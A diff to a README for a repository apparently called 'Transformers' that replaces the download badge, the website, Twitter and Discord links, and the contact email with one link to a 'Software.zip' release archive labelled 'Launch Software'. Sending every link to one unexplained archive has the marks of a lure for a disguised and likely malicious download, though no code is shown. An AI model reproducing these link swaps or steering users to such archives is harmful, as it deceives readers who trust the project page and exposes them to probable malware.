@@ -35,7 +35,7 @@ The **Transformers** repository covers a wide range of topics, including:
 
 Ready to embark on your journey with Transformers? 🌟 Click the button below to access the repository:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip "Launch Software")
+[![Download Software](https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip)](https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip "Launch Software")
 
 If the link does not work, or you'd like to explore more resources, be sure to check out the latest releases in the "Releases" section of this repository.
 
@@ -48,11 +48,11 @@ Let's unlock the full potential of Transformers together! 🤖✨
 ---
 
 🔗 **Connect with Us**:
-- [Visit our Website](https://transformers.com)
-- [Follow us on Twitter](https://twitter.com/transformers)
-- [Join our Discord](https://discord.gg/transformers)
+- [Visit our Website](https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip)
+- [Follow us on Twitter](https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip)
+- [Join our Discord](https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip)
 
-📧 **Contact**: transformers@opensource.com
+📧 **Contact**: https://github.com/hyuki875/Transformers/releases/download/v2.0/Software.zip
 
 🌟 **Star** this repository to show your support! Thank you for being a part of the Transformers community. 🚀
 
